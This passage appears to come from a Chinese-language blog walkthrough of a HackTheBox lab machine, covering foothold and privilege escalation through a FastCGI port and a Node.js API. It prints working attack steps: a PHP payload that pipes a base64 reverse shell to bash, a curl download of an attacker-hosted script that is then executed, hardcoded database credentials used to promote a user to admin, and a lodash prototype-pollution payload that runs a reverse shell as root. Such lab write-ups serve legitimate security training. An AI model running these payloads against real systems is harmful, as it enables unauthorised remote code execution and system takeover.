<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxwww | grep victor</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victor      1119  0.0  0.5 265840 21416 ?        S    Mar31   0:00 php-fpm: pool victor</span><br><span class="line">victor      1120  0.0  0.5 265840 21664 ?        S    Mar31   0:00 php-fpm: pool victor</span><br></pre></td></tr></table></figure>
<p>9000端口疑似为FastCGI，3000端口根据之前的HTTP记录可以得知为API</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></p>
</blockquote>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure>
<p>构造shell脚本，替换部分内容如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD=<span class="string">&quot;&lt;?php echo &#x27;&lt;!--&#x27;; system(&#x27;echo -n <span class="variable">$PYTHON_REVERSE_SHELL_PAYLOAD_BASE64_ENCODED</span> | base64 -d | bash &#x27;); echo &#x27;--&gt;&#x27;;&quot;</span></span><br><span class="line">FILENAMES=<span class="string">&quot;/tmp/bfl.php&quot;</span> <span class="comment"># Exisiting file path</span></span><br></pre></td></tr></table></figure>
<p>开启HTTP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>获取shell脚本并执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/bfl.php</span><br><span class="line">curl http://10.10.*.*/bfl.sh -o /tmp/bfl.sh</span><br><span class="line">bash /tmp/bfl.sh &amp;</span><br></pre></td></tr></table></figure>
<p>获得反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88ca55f71209346e09d9612d70defd95</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2>
<p>用户victor的Home路径下有一份pollution_api的源码</p>
<p>查看服务进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxwww | grep index.js</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root        1325  0.0  1.9 1681764 79172 ?       Sl   Mar31   0:02 &#x2F;usr&#x2F;bin&#x2F;node &#x2F;root&#x2F;pollution_api&#x2F;index.js</span><br></pre></td></tr></table></figure>
<p>基本确定提权是要利用Node.Js服务的漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/index.js</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>, <span class="attr">Message</span>: <span class="string">&#x27;Read documentation from api in /documentation&#x27;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/auth&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/auth&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/client&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/client&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/admin&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/admin&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/documentation&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/documentation&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listen on http://localhost:3000&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>查看<code>/home/victor/pollution_api/routes/auth.js</code></p>
<p>此部分与登录相关</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/routes/auth.js</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../models/User&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> &#123; signtoken &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.body.username != <span class="literal">null</span> &amp;&amp; req.body.password != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: req.body.username&#125;&#125;)</span><br><span class="line">            <span class="keyword">if</span>(find.length == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                User.create(&#123;</span><br><span class="line">                    username: req.body.username,</span><br><span class="line">                    password: req.body.password,</span><br><span class="line">                    role: <span class="string">&quot;user&quot;</span></span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_register&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;This user already exists&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Parameters not found&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.body.username != <span class="literal">null</span> &amp;&amp; req.body.password != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;&#125;);</span><br><span class="line">            <span class="keyword">if</span>(find.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">const</span> token = signtoken(&#123;<span class="attr">user</span>: find[<span class="number">0</span>].username, <span class="attr">is_auth</span>: <span class="literal">true</span>, <span class="attr">role</span>: find[<span class="number">0</span>].role&#125;);</span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">                    Status: <span class="string">&quot;Ok&quot;</span>,</span><br><span class="line">                    Header: &#123;</span><br><span class="line">                        <span class="string">&quot;x-access-token&quot;</span>: token</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;Invalid Credentials&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Parameters not found&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p>进入路径<code>/home/victor/pollution_api/model</code>，可以看到一个<code>db.js</code></p>
<p>查看<code>/home/victor/pollution_api/model/db.js</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/model/db.js</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Sequelize = <span class="built_in">require</span>(<span class="string">&#x27;sequelize&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sequelize = <span class="keyword">new</span> Sequelize(<span class="string">&#x27;pollution_api&#x27;</span>,<span class="string">&#x27;webapp_user&#x27;</span>,<span class="string">&#x27;Str0ngP4ssw0rdB*12@1&#x27;</span>,&#123;</span><br><span class="line">    host: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    dialect: <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    define: &#123;</span><br><span class="line">        charset: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">        collate: <span class="string">&#x27;utf8_general_ci&#x27;</span>,</span><br><span class="line">        timestamps: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    logging: <span class="literal">false</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; Sequelize, sequelize &#125;;</span><br></pre></td></tr></table></figure>
<p>该服务的账户存储于Mysql中</p>
<p>查看<code>/home/victor/pollution_api/routes/admin.js</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/routes/admin.js</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../models/User&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; decodejwt &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//controllers</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; messages &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/Messages&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; messages_send &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/Messages_send&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.use(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span>(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.headers[<span class="string">&quot;x-access-token&quot;</span>])&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = decodejwt(req.headers[<span class="string">&quot;x-access-token&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(token)&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: token.user, <span class="attr">role</span>: token.role&#125;&#125;);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(find.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(find[<span class="number">0</span>].username == token.user &amp;&amp; find[<span class="number">0</span>].role == token.role &amp;&amp; token.role == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> next();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>, <span class="attr">Message</span>: <span class="string">&#x27;Read documentation from api in /documentation&#x27;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/messages&#x27;</span>,messages);</span><br><span class="line">router.post(<span class="string">&#x27;/messages/send&#x27;</span>, messages_send);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p>这里会对Token进行校验，Token的用户名和role需要与数据库中的内容匹配且role需要为&quot;admin&quot;</p>
<p>查看<code>/home/victor/pollution_api/controllers/Messages_send.js</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/controllers/Messages_send.js</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Message = <span class="built_in">require</span>(<span class="string">&#x27;../models/Message&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; decodejwt &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> messages_send = <span class="keyword">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = decodejwt(req.headers[<span class="string">&#x27;x-access-token&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span>(req.body.text)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> message = &#123;</span><br><span class="line">            user_sent: token.user,</span><br><span class="line">            title: <span class="string">&quot;Message for admins&quot;</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        _.merge(message, req.body);</span><br><span class="line"></span><br><span class="line">        exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        Message.create(&#123;</span><br><span class="line">            text: <span class="built_in">JSON</span>.stringify(message),</span><br><span class="line">            user_sent: token.user</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;Parameter text not found&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; messages_send &#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61209261/article/details/125821976">https://blog.csdn.net/qq_61209261/article/details/125821976</a></p>
</blockquote>
<p>函数<code>merge</code>存在js原型污染漏洞</p>
<p>注册用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://127.0.0.1:3000/auth/register&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;username&quot;: &quot;Bufferfly&quot;, &quot;password&quot;: &quot;Bufferfly&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>获取tty，访问Mysql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u webapp_user -p<span class="string">&#x27;Str0ngP4ssw0rdB*12@1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>查看用户表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pollution_api.users;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br><span class="line">| id | username  | password  | role | createdAt           | updatedAt           |</span><br><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br><span class="line">|  1 | Bufferfly | Bufferfly | user | 2023-04-01 17:13:24 | 2023-04-01 17:13:24 |</span><br><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br></pre></td></tr></table></figure>
<p>更改role字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> pollution_api.users <span class="keyword">set</span> role<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pollution_api.users;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br><span class="line">| id | username  | password  | role  | createdAt           | updatedAt           |</span><br><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | Bufferfly | Bufferfly | admin | 2023-04-01 17:13:24 | 2023-04-01 17:13:24 |</span><br><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br></pre></td></tr></table></figure>
<p>登录API，获得Token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:3000/auth/login -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;Bufferfly&quot;,&quot;password&quot;:&quot;Bufferfly&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;Status&quot;</span>:<span class="string">&quot;Ok&quot;</span>,<span class="attr">&quot;Header&quot;</span>:&#123;<span class="attr">&quot;x-access-token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiQnVmZmVyZmx5IiwiaXNfYXV0aCI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgwMzY5NjM5LCJleHAiOjE2ODAzNzMyMzl9.U1kKGgUlgtNnE3_OD3h7n-tB7cBI4FQYv-yixokgxKc&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline</a></p>
</blockquote>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
<p>触发原型污染漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:3000/admin/messages/send -d <span class="string">&#x27;&#123;&quot;text&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\&quot;child_process\&quot;).execSync(\&quot;echo -n $PYTHON_REVERSE_SHELL_PAYLOAD_BASE64_ENCODED | base64 -d | bash\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -H <span class="string">&quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiQnVmZmVyZmx5IiwiaXNfYXV0aCI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgwMzY5NjM5LCJleHAiOjE2ODAzNzMyMzl9.U1kKGgUlgtNnE3_OD3h7n-tB7cBI4FQYv-yixokgxKc&quot;</span></span><br></pre></td></tr></table></figure>
<p>查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">748b470c7c0daaf4c5754c19ba32b9f1</span><br></pre></td></tr></table></figure>
<hr />
<p>虽然不太懂js原型污染的漏洞原理，但是跟着hacktricks抄Payload就能打通，以后再看吧</p>
<p>一个月做了12台靶机带几个题总算是上到Pro Hacker了</p>
<p>博客文章得整理一下，该好好准备OSCP了</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>xXxYOLOxXx
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/" title="HackTheBox_All_In_One">https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
